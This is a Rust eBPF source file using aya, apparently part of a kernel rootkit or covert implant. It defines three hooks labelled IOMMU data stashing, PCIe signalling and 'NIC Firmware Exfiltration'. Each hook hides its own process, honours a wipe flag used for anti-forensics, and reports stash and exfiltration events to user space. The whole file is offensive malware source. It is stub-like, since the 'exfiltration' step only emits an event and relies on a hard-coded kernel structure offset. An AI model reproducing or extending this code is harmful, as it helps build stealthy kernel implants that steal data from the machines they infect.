use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_read_kernel},
    macros::kprobe,
    programs::ProbeContext,
};
use common::{EventHeader, EVENT_DMA_STASH, EVENT_NIC_EXFIL, EVENT_PCIE_TLP_SIGNAL};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 61: IOMMU Page Table Data Stashing
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_iommu_map(ctx: ProbeContext) -> u32 {
    try_iommu_map(&ctx).unwrap_or_default()
}

fn try_iommu_map(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let enabled = match unsafe { IOMMU_STATE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    if enabled == 0 {
        return Ok(0);
    }

    let iova: u64 = unsafe { ctx.arg(1).ok_or(1i64)? };
    let paddr: u64 = unsafe { ctx.arg(2).ok_or(1i64)? };

    if unsafe { DMA_STASH_ADDRS.get(&iova) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_DMA_STASH,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: paddr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 62: PCIe TLP Pattern Signaling
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_pci_config_read(ctx: ProbeContext) -> u32 {
    try_pci_config_read(&ctx).unwrap_or_default()
}

fn try_pci_config_read(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let dev_fn: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let reg: u32 = unsafe { ctx.arg::<u64>(1).ok_or(1i64)? as u32 };

    let tlp_key = reg;
    if let Some(_data) = unsafe { PCIE_TLP_QUEUE.get(&tlp_key) } {
        let event = EventHeader {
            event_type: EVENT_PCIE_TLP_SIGNAL,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dev_fn,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 63: NIC Firmware Exfiltration
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_ndo_start_xmit(ctx: ProbeContext) -> u32 {
    try_ndo_start_xmit(&ctx).unwrap_or_default()
}

fn try_ndo_start_xmit(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let skb_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let skb_len: u32 = unsafe { bpf_probe_read_kernel((skb_ptr + 112) as *const u32)? };

    if skb_len > 60 {
        let exfil_addr = match unsafe { IOMMU_STATE.get(1) } {
            Some(&v) => v,
            None => return Ok(0),
        };

        if exfil_addr != 0 {
            let event = EventHeader {
                event_type: EVENT_NIC_EXFIL,
                pid,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: skb_len as u64,
            };
            let _ = EVENTS.output(&event, 0);
        }
    }

    Ok(0)
}
